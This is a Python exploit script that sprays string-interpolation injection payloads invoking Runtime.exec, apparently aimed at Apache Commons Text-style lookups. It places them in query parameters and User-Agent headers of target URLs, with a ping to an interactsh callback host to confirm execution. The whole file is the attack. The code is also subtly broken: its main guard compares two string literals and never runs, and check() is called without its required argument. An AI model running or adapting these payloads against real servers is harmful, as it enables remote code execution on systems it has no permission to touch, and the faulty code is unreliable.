import argparse
import requests
from urllib.parse import urlparse, urlunparse, quote
import time


class Exploit:
    def __init__(self, host, targets, interactsh_host, proxy):
        self.host = host
        self.targets = targets
        self.proxy = proxy
        self.interactsh_host = interactsh_host

    def run(self):
        session = requests.Session()
        session.proxies = {"http": self.proxy}
        command = f"ping -c 1 {self.interactsh_host}"
        payloads = ["${script:javascript:java.lang.Runtime.getRuntime().exec('" + command + "')}",
                    "${url:UTF-8:java.lang.Runtime.getRuntime().exec('" + command + "')}",
                    "${dns:address:java.lang.Runtime.getRuntime().exec('" + command + "')}"]
        host_parser = urlparse(self.host)
        for target in self.targets:
            parsed_url = urlparse(target)
            if parsed_url.query:
                query_payload = [0] * len(payloads)
                for payload in payloads:
                    queries = parsed_url.query.split('&')
                    query_index = 0
                    while query_index < len(queries):
                        queries[query_index] = queries[query_index].split("=")[0] + "=" + payload
                        query_index += 1
                    query_param = "&".join(queries)
                    url = urlunparse((host_parser.scheme, host_parser.netloc, parsed_url.path, '', quote(query_param,"="), ''))
                    response = session.get(url)
            for payload in payloads:
                header = {"User-Agent": quote(payload,"=")}
                response = session.get(f"{self.host}{target}", headers=header)

    def check(self, file):
        pass

if "__name__" == "__main__":
    parser = argparse.ArgumentParser()

    parser.add_argument("--host", "-u", required=True, help="Host Url with scheme", type=str)
    parser.add_argument("--input", "-i", help="full path of the file containing potential targets", type=str)
    parser.add_argument("--target", "-t", help="Path of the single target (without hostname)", type=str)
    parser.add_argument("--interactsh", "-v", required=True, help="Interactsh host - used to validate", type=str)
    # parser.add_argument("--callback_url",required=True, help="Callback ip and port", type=str)
    parser.add_argument("--proxy", "-p", help="Proxy details", default="", type=str)
    args = parser.parse_args()

    if args.input and not args.target:
        file = open(args.input)
        targets = file.readlines()
        exploit = Exploit(args.host, targets, args.interactsh, args.proxy)
        exploit.run()
        exploit.check()
    elif args.target:
        targets = [args.target]
        exploit = Exploit(args.host, targets, args.interactsh, args.proxy)
        exploit.run()
        exploit.check()
    else:
        print("Provide any and only one of --input and --target")

